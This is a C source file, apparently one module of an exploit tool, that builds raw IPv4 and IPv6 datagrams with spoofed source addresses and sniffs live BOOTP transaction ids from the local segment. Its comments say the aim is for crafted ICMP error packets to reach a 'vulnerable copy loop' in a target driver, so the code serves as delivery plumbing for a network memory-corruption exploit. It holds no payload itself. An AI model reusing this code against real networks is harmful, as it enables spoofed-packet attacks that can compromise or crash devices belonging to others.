/* net.c - raw L3 transport.
 *
 * We do not use a SOCK_RAW ICMP socket: the kernel normalises ICMP error
 * headers and refuses a foreign source address.  Everything is built as a
 * complete IP datagram and sent with IP_HDRINCL on AF_INET/SOCK_RAW, bound to
 * the egress interface so the kernel does not emit a redirect for the spoofed
 * source.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#ifdef __linux__
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#endif

#include "net.h"

int net_send_l3(int fd, const char *ifname, const uint8_t *pkt, size_t len,
                uint32_t dst)
{
  struct sockaddr_in sin;
  int one = 1;

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
    perror("IP_HDRINCL");
    return -1;
  }
  if (ifname) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
    if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
      perror("SO_BINDTODEVICE");    /* not fatal: routing still works */
  }
  memset(&sin, 0, sizeof(sin));
  sin.sin_family      = AF_INET;
  sin.sin_addr.s_addr = dst;
  if (sendto(fd, pkt, len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    perror("sendto");
    return -1;
  }
  return 0;
}

int net_send_l3_v6(int fd, const char *ifname, const uint8_t *pkt, size_t len,
                   const uint8_t dst[16])
{
  struct sockaddr_in6 sin6;
  int one = 1;

  if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &one, sizeof(one)) < 0) {
    perror("IPV6_HDRINCL");
    return -1;
  }
  if (ifname) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
    setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
  }
  memset(&sin6, 0, sizeof(sin6));
  sin6.sin6_family = AF_INET6;
  memcpy(&sin6.sin6_addr, dst, 16);
  if (sendto(fd, pkt, len, 0, (struct sockaddr *)&sin6, sizeof(sin6)) < 0) {
    perror("sendto6");
    return -1;
  }
  return 0;
}

/* Pull the live BOOTP transaction id off the segment.  The ICMP error has to
 * quote a datagram the driver still has an armed receive token for, or the IP
 * layer drops it before the vulnerable copy loop. */
int net_sniff_xid(const char *ifname, uint32_t *xid_out, uint32_t *client_ip)
{
#ifdef __linux__
  int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
  struct sockaddr_ll sll;
  uint8_t buf[2048];
  time_t deadline = time(NULL) + 30;

  if (fd < 0) { perror("AF_PACKET"); return -1; }
  memset(&sll, 0, sizeof(sll));
  sll.sll_family   = AF_PACKET;
  sll.sll_protocol = htons(ETH_P_IP);
  sll.sll_ifindex  = (int)if_nametoindex(ifname);
  if (!sll.sll_ifindex) { close(fd); return -1; }
  if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
    perror("bind"); close(fd); return -1;
  }

  while (time(NULL) < deadline) {
    ssize_t n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
    if (n < 42) { usleep(20000); continue; }
    size_t ihl = (size_t)(buf[0] & 0x0f) * 4;
    if (buf[9] != 17 || (size_t)n < ihl + 16) continue;
    const uint8_t *udp = buf + ihl;
    uint16_t sport = (uint16_t)(udp[0] << 8 | udp[1]);
    uint16_t dport = (uint16_t)(udp[2] << 8 | udp[3]);
    if (dport != 67 && sport != 67) continue;
    const uint8_t *bootp = udp + 8;
    if ((size_t)(bootp - buf) + 8 > (size_t)n) continue;
    *xid_out = (uint32_t)bootp[4] << 24 | (uint32_t)bootp[5] << 16 |
               (uint32_t)bootp[6] << 8  | (uint32_t)bootp[7];
    if (client_ip) memcpy(client_ip, buf + 12, 4);
    close(fd);
    return 0;
  }
  close(fd);
  return -1;
#else
  (void)ifname; (void)xid_out; (void)client_ip;
  return -1;
#endif
}
